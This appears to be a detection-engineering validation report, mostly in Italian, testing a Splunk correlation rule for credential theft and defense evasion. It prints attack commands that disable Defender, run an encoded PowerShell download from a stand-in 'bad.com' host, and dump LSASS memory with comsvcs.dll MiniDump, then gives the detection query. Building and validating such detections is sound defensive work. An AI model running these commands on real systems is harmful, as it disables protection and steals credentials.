# 🧪 Validation Report: Correlation Rule - Credential Theft & Evasion

## 📋 Informazioni Generali
* **Correlation Name:** Multi-Stage Attack: Credential Theft & Evasion
* **Regola di Riferimento:** `12-Correlation-Credential-Theft.md`
* **Severity:** 🔴 CRITICAL
* **Obiettivo:** Validare il rilevamento dell'esfiltrazione della memoria LSASS successiva alla disattivazione dell'antivirus tramite PowerShell.

## 🎯 The Attack Chain (Kill Chain Simulata)
I seguenti comandi sono stati eseguiti (entro 24 ore) sulla postazione bersaglio.

**Fase 1: Defense Evasion (Disattivazione Defender)**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Fase 2: Execution (Esecuzione Payload Offuscato)**
```powershell
powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAiAA==
```

**Fase 3: Credential Access (LSASS Memory Dump)**
```powershell
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\lsass.dmp full
```

<img width="840" height="648" alt="Screenshot 2026-06-14 171419" src="https://github.com/user-attachments/assets/061c1a90-5cc5-48fa-892d-681c624fc9c3" />

---

## 📡 Telemetria Attesa

1. `EventCode 4688` / `EventCode 1` con stringa `Set-MpPreference`
2. `EventCode 4688` / `EventCode 1` con flag `-enc`
3. `EventCode 10` (Sysmon Process Access) verso `lsass.exe`

## 🔴 Correlated Splunk Query (SPL)
```SPL
(index=wineventlog OR index=sysmon) 
( 
  (EventCode=1 OR EventCode=4688) ("* -enc *" OR "* -encodedcommand *") 
) OR ( 
  ("*DisableRealtimeMonitoring*" OR "*Set-MpPreference*") 
) OR ( 
  EventCode=10 TargetImage="*\\lsass.exe" 
)
| transaction host maxspan=24h
| search "lsass.exe" AND ("-enc" OR "-encodedcommand") AND ("DisableRealtimeMonitoring" OR "Set-MpPreference")
| eval Attack_Chain="ALLARME CRITICO: Esecuzione Powershell Encoded -> Disattivazione Defender -> Accesso e Dumping di LSASS"
| table _time, host, duration, Attack_Chain
```

## ✅ Risultato della Validazione e Screenshot
La correlazione ha raggruppato perfettamente la timeline d'attacco isolando l'host compromesso.

**Risultato:** `PASS` 🟢

<img width="1200" height="487" alt="Screenshot 2026-06-14 171520" src="https://github.com/user-attachments/assets/8b567b8f-6e89-4ff6-a667-9cd6432af59e" />
